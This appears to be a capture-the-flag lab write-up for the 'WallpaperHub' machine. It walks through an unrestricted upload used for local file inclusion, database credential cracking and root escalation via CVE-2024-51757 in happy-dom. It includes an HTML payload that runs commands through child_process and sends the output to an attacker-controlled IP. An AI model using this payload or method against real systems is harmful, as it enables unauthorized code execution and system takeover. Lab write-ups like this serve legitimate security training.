# Objectives

:::summary
This lab demonstrates the exploitation of an unrestricted file upload vulnerability in a wallpaper sharing platform. Learners will perform local file inclusion to extract sensitive files, retrieve a database with hashed credentials, and crack them for SSH access. Privilege escalation is achieved by exploiting a vulnerable happy-dom package (CVE-2024-51757) in a web scraping tool, ultimately gaining root access through a crafted HTML payload.
:::

## Attack WallpaperHub

- Perform an Nmap scan to discover open ports and services.

- Exploit the unrestricted file upload vulnerability to access sensitive system files.

- Extract and analyze the SQLite database to retrieve hashed user credentials.

- Crack the password hash and gain SSH access as a low-privileged user.

- Exploit CVE-2024-51757 in happy-dom to execute arbitrary code and escalate privileges to root.

## Recon

### Nmap

```bash
sudo nmap -sC -sV wallpaperhub -sT -vvvv -p- -Pn -T5 --min-rate=5000

### 5000/TCP - HTTP

![](../../../assets/b644d17f70c1a95d9f2670e2a055924a.png)

I went ahead and registered an account called *test*:

![](../../../assets/c53d8a68431d2ff9767d4c5352de8662.png)

I notice right away the **Upload Wallpaper** tab:

![](../../../assets/2a2d02efc4bf497cda5116486779237a.png)

I uploaded a sample `.png` file to check out the inner workings of the site:

![](../../../assets/9af5d3df32b2f769d3a472a4de1743cf.png)

However the upload script is unrestricted and it let's me upload any file such as a webshell:

![](../../../assets/6c9bce947703cd81673a820d32aceb4f.png)

Since the application is running on `python` though, it will not execute `php` code thus we need to think of something else.

## LFI

I intercept the request with `burpsuite` and send the request to repeater where I modify the request as follows:

![](../../../assets/09fea4ce545a9d618a6af240692066b3.png)

When I go ahead and press **Send** I get a response back that doesn't seem like it worked:

![](../../../assets/2460a1517b0574c1014c845f6a9cb734.png)

However when we check back on the website we see a fresh upload, click on it and we see the following:

![](../../../assets/8a24b917f4e3273bb852801d523a2bf2.png)

![](../../../assets/76c6a37ac8cb1e6b95c3bac85a06ab10.png)

Awesome! We were able to fetch the `/etc/passwd` list.

Now that we have performed **LFI** we need to find any sort of sensitive files containing cleartext or hashed credentials, my first though instantly went to `.ssh/id_rsa` but it looks like the user doesn't have any:

![](../../../assets/f6717e7b83c8ab68a35c0dfaa8fbb391.png)

### SQLite Database

After a lot of guessing we find the `database.db` file location:

![](../../../assets/58640da7c45b84306b387126e89d3cad.png)

:::note
My first guess was the `/var/www/html` webroot, but turns out it's in the developer's home directory.
:::

![](../../../assets/a15ae57b4b3d4a344cbd5c5c6898c711.png)

Fairly small database, good!

![](../../../assets/0d5f5c6fe8b458481f9b15d1f8d22f4d.png)

:::note
The *test* user is us

### Hashcat

## Foothold
### Shell as wp_hub

Using the found creds we log into `ssh`:

### local.txt

## Privilege Escalation
### Enumeration

I download over `linpeas` and get to work.

At first glance the system looks pretty bulletproof and up to date:

![](../../../assets/02737b8152d519a76f3ab272614f4640.png)

We do find something super interesting though:

![](../../../assets/4fa8fe5e796dc722f292c63b915add64.png)

Let's check the binary out.

### CVE-2024-51757

![](../../../assets/c62a9aa0da3f97f13cf41f974c63105d.png)

It's some `JS` code including a package called `happy-dom`, I've never heard of it before so I decide to look into it.

![](../../../assets/134bcd4df93c162d22f60a9af107d528.png)

![](../../../assets/d04f3d4a9f9d72fbea1fafbc172cba63.png)

Seems pretty serious, good for us.

## Exploitation

I modified it as follows to test it out:

```js
<script src="http://192.168.45.179/'+require('child_process').execSync('id').toString()+'"></script>
```

![](../../../assets/096bda9403a4d8b9dbca16a075089093.png)

On `kali` I launched a python webserver beforehand where I received the output:

![](../../../assets/4e21da04ca90e36d7b6b242fe6258a02.png)

It indeed executes commands under *root*.

I slightly modify the `pwn.html` file:

![](../../../assets/77a3f5f9be7c8c6a9d404d56539f14a9.png)

And launch it again:

![](../../../assets/fad872e1bab0f345ba79d002696612fa.png)

:::fail
Unfortunately it failed this time, even if I URL encode it, guess we need to do it another way.
:::

Instead I went on to do the following:

![](../../../assets/396059113020170a9dfb30407daaa3a9.png)

I created a script called `pwn` as seen above.

I then used `chmod +x` on it to make it executable.

Inside my `pwn.html` file I added the following instead of the `id` command:

![](../../../assets/71b3aab35a0a1137b0b66e372c119d68.png)

I now reran the script:

![](../../../assets/89165254adfbf95cf7ca7966c06a457a.png)

Good, we can now execute `/bin/bash -p` to escalate to a *root* shell within the same session:
